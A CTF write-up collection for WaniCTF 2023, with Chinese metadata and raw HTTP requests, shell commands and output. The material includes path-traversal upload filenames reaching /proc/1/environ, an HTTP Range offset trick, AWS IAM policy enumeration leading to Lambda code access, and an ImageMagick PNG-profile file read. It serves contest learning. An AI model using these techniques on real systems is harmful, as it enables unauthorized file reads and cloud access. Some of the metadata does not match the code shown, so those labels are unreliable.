---
title: WaniCTF 2023 Writeups
contest: WaniCTF 2023
year: 2023
difficulty: medium
vuln_type: ssrf
tags:
- indexeddb_chrome
- zip_path_traversal
- http_range_2gb
- aws_lambda_iam
- image_magick_mvg
- pngcrush_profile
- exiftool_publisher_base64
- usb_keyboard_parser
- iso_9660
attack_chain: 'extract1:indexedDB open testDB → objectStore.put({name:"FLAG{...}"}) / extract2:POST /file=x.zip multipart + target=flag 路径穿越 (含 PK 头) / 64bps:GET /2gb.txt Range: bytes=2147483648- 超 32 位偏移 / lapsus$:ImageMagick MVG SSRF+file:// 黑名单绕过 / aws:SecretUser IAM → aws iam get-policy-version → WaniLambdaGetFunc → lambda:GetFunction wani_function → S3 code / certified:POST /create file=../../../../../../proc/1/environ + target → image magick 错误回显 / chall.mp4 exiftool Publisher: flag_base64 / updog ISO 9660 + Usb_Keyboard_Parser.py pcap'
key_payload: 'openRequest.onupgradeneeded = {objectStore.put({name:"FLAG{[redacted]}"})} / Range: bytes=2147483648- / aws iam get-policy-version --policy-arn arn:aws:iam::839865256996:policy/WaniLambdaGetFunc / exiftool Publisher : flag_base64:[redacted]'
one_liner: WaniCTF 2023 全题型 WP，IndexedDB 浏览器数据 + zip 路径穿越 + HTTP Range 2GB 偏移 + AWS Lambda IAM 权限提升 + ImageMagick MVG SSRF + PNG tEXt profile + exiftool + USB HID。
lesson: HTTP Range 字节偏移 2147483648 触发整数溢出读 2GB 外内容；AWS IAM 用户即使 lambda:ListFunctions 被拒，也可通过 iam:GetPolicy 列举自己策略发现隐藏的 lambda:GetFunction 资源限制。
quality: high
full_path: WaniCTF_2023_Writeups.full.md
meta_path: WaniCTF_2023_Writeups.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: WaniCTF 2023 Writeups。WaniCTF 2023 全题型 WP，IndexedDB 浏览器数据 + zip 路径穿越 + HTTP Range 2GB 偏移 + AWS Lambda IAM 权限提升 + ImageMagick MVG SSRF + PNG tEXt profile + exiftool + USB HID。。经验：HTTP Range 字节偏移 214...
category: web
subcategory: web_other
tools_used:
- ExifTool
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/113562.html
reasoning_chain:
- extract1 触发点：浏览器存储 IndexedDB → openRequest.onupgradeneeded objectStore.put({name:'FLAG{...}'}) → 假设：浏览器数据需手动提取
- 动作：Chrome DevTools → Application → IndexedDB → testDB → testObjectStore → name 字段
- extract2 触发点：POST /file=x.zip multipart + target=flag 路径穿越（含 PK 头）→ 假设：zip 头 PK 可绕过白名单
- '64bps：GET /2gb.txt Range: bytes=2147483648- 触发 32 位整数溢出读 2GB 外内容 → 假设：偏移溢出会回环'
- lapsus$：ImageMagick MVG SSRF + file:// 黑名单绕过 → 触发点：MVG push graphic-context viewbox 0 0 640 480 fill 'url(https://...)'
- aws：SecretUser IAM → aws iam get-policy-version → WaniLambdaGetFunc → lambda:GetFunction wani_function → 假设：IAM 权限提升
- 动作：aws iam get-policy-version --policy-arn arn:aws:iam::839865256996:policy/WaniLambdaGetFunc → 拿到 lambda:GetFunction → lambda:GetFunction wani_function → S3 code
- certified 触发点：POST /create file=../../../../../../proc/1/environ + target → 假设：Image Magick 错误回显泄露
- 'chall.mp4 exiftool Publisher: flag_base64 → 假设：exiftool Publisher 字段藏 base64'
- updog：ISO 9660 + Usb_Keyboard_Parser.py pcap → 假设：USB HID 键盘流量 + ISO 9660 文件系统
failed_attempts:
- extract2 试图纯路径穿越 → 失败：必须 multipart 上传 zip 文件头 PK 触发
- '64bps 试图 Range: bytes=0-100 → 失败：必须 bytes=2147483648- 整数溢出'
- aws 试图 lambda:ListFunctions → 失败：必须 iam:GetPolicy 列举自己策略发现隐藏 lambda:GetFunction
key_observations:
- HTTP Range 字节偏移 2147483648 触发整数溢出读 2GB 外内容
- AWS IAM 用户即使 lambda:ListFunctions 被拒，也可通过 iam:GetPolicy 列举自己策略发现隐藏的 lambda:GetFunction 资源限制
- IndexedDB 是浏览器存储取证的常见入口（Chrome DevTools Application）
- ImageMagick MVG push graphic-context viewbox SSRF 是 2023 经典 trick
- exiftool Publisher 字段藏 base64 flag 是 CTF MISC 常见套路
prerequisites:
- Chrome DevTools IndexedDB 提取
- HTTP Range 头整数溢出（2147483648 边界）
- AWS IAM 权限提升（get-policy-version）
- ImageMagick MVG 解析
- USB HID 键盘流量 + ISO 9660 文件系统
---
# WaniCTF 2023 Writeups

> 原文: https://www.ctfiot.com/113562.html
> ID: 113562


```
window.onload = function () {
 var openRequest = indexedDB.open("testDB");

 openRequest.onupgradeneeded = function () {
 connection = openRequest.result;
 var objectStore = connection.createObjectStore("testObjectStore", {
 keyPath: "name",
 });
 objectStore.put({ name: "FLAG{[redacted]}" });
 };
 ...
}
POST / HTTP/1.1
Host: extract1-web.wanictf.org
Content-Length: 457
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary31EmG2GSyMaONPVG
Connection: close

------WebKitFormBoundary31EmG2GSyMaONPVG
Content-Disposition: form-data; name="file"; filename="x.zip"
Content-Type: application/x-zip-compressed

PK
...
------WebKitFormBoundary31EmG2GSyMaONPVG
Content-Disposition: form-data; name="target"

flag
------WebKitFormBoundary31EmG2GSyMaONPVG--
GET /2gb.txt HTTP/1.1
Host: 64bps-web.wanictf.org
Connection: close
Range: bytes=2147483648-
if (!req.query.url.includes("http") || req.query.url.includes("file")) {
 res.status(400).send("Bad Request");
 return;
}
ARG MAGICK_URL="https://github.com/ImageMagick/ImageMagick/releases/download/7.1.0-51/ImageMagick--gcc-x86_64.AppImage"
$ convert -size 500x500 xc:
white test.png

$ pngcrush -text a "profile" "/flag_A" test.png read_flag1.png
 Recompressing IDAT chunks in test.png to read_flag1.png
 Total length of data found in critical chunks = 179
 Best pngcrush method = 5 (ws 15 fm 1 zl 9 zs 1) = 179
CPU time decode 0.004579, encode 0.007305, other 0.008650, total 0.024044 sec
$ identify -verbose 5025f8fc-e012-4e48-95bc-1a5120173765.png
Image:
 Filename: 5025f8fc-e012-4e48-95bc-1a5120173765.png
 Format: PNG (Portable Network Graphics)
 Mime type: image/png
 Class: PseudoClass
...
 Raw profile type:

 42
464c4[redacted]17d0a

 signature: c984ee3cffb73bfe6b045d9af5c2cf26f72a8731188e5ac7f911d2ef570c9e6c
...
$ aws configure
AWS Access Key ID []: ******************7
AWS Secret Access Key []: ******************3
Default region name []: ap-northeast-1
Default output format [None]:
$ aws lambda list-functions

An error occurred (AccessDeniedException) when calling the ListFunctions operation: User: arn:
aws:
iam::
839865256996:
user/SecretUser is not authorized to perform: lambda:
ListFunctions on resource: * because no identity-based policy allows the lambda:
ListFunctions action
$ aws iam list-attached-user-policies --user-name SecretUser --query 'AttachedPolicies[].PolicyArn'
[
 "arn:
aws:
iam::
839865256996:
policy/WaniLambdaGetFunc",
 "arn:
aws:
iam::
aws:
policy/AWSCompromisedKeyQuarantineV2"
]

$ aws iam get-policy --policy-arn arn:
aws:
iam::
839865256996:
policy/WaniLambdaGetFunc
{
 "Policy": {
 "PolicyName": "WaniLambdaGetFunc",
 "PolicyId": "ANPA4HC66ZQSAS4EGIKSK",
 "Arn": "arn:
aws:
iam::
839865256996:
policy/WaniLambdaGetFunc",
 "Path": "/",
 "DefaultVersionId": "v1",
 "AttachmentCount": 1,
 "PermissionsBoundaryUsageCount": 0,
 "IsAttachable": true,
 "CreateDate": "2023-04-23T01:27:27+00:00",
 "UpdateDate": "2023-04-23T01:27:27+00:00",
 "Tags": []
 }
}

$ aws iam get-policy-version --policy-arn arn:
aws:
iam::
839865256996:
policy/WaniLambdaGetFunc --version-id v1
{
 "PolicyVersion": {
 "Document": {
 "Version": "2012-10-17",
 "Statement": [
 {
 "Sid": "VisualEditor0",
 "Effect": "Allow",
 "Action": [
 "iam:
ListPolicies",
 "iam:
GetRole",
 "iam:
GetPolicyVersion",
 "iam:
GetPolicy",
 "iam:
ListAttachedRolePolicies",
 "iam:
ListAttachedUserPolicies",
 "iam:
ListRoles",
 "apigateway:
GET",
 "iam:
ListRolePolicies",
 "iam:
GetRolePolicy"
 ],
 "Resource": "*"
 },
 {
 "Sid": "VisualEditor1",
 "Effect": "Allow",
 "Action": "lambda:
GetFunction",
 "Resource": "arn:
aws:
lambda:ap-northeast-1:
839865256996:
function:
wani_function"
 }
 ]
 },
 "VersionId": "v1",
 "IsDefaultVersion": true,
 "CreateDate": "2023-04-23T01:27:27+00:00"
 }
}
$ aws lambda get-function --function-name arn:
aws:
lambda:ap-northeast-1:
839865256996:
function:
wani_function
{
...
 "Code": {
 "RepositoryType": "S3",
 "Location": "https://aw..."
 }
}
POST /create HTTP/1.1
Host: certified-web.wanictf.org
Content-Length: 209
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynhRb8NemRluVGlVs
Connection: close

------WebKitFormBoundarynhRb8NemRluVGlVs
Content-Disposition: form-data; name="file"; filename="../../../../../../proc/1/environ"
Content-Type: image/png

hoge
------WebKitFormBoundarynhRb8NemRluVGlVs--
HTTP/1.1 500 Internal Server Error
Server: nginx
Date: Sat, 06 May 2023 05:36:43 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 208
Connection: close

Failed to process image

Caused by:
 image processing failed on ./data/c30bb6ca-63a6-4c9f-ade1-0b3c3fb88a74:
 magick: no decode delegate for this image format `' @ error/constitute.c/ReadImage/741.
$ exiftool chall.mp4
ExifTool Version Number : 12.57
File Name : chall.mp4
...
Publisher : flag_base64:[redacted]
Image Size : 512x512
...
$ file *
updog: ISO 9660 CD-ROM filesystem data 'ISO Label'
$ python3 CTF-Usb_Keyboard_Parser/Usb_Keyboard_Parser.py chall.pcap

[+]Using filter "usb.capdata" Retrived HID Data is :

FLAG{[redacted]}

[+]Using filter "usbhid.data" Retrived HID Data is :
```
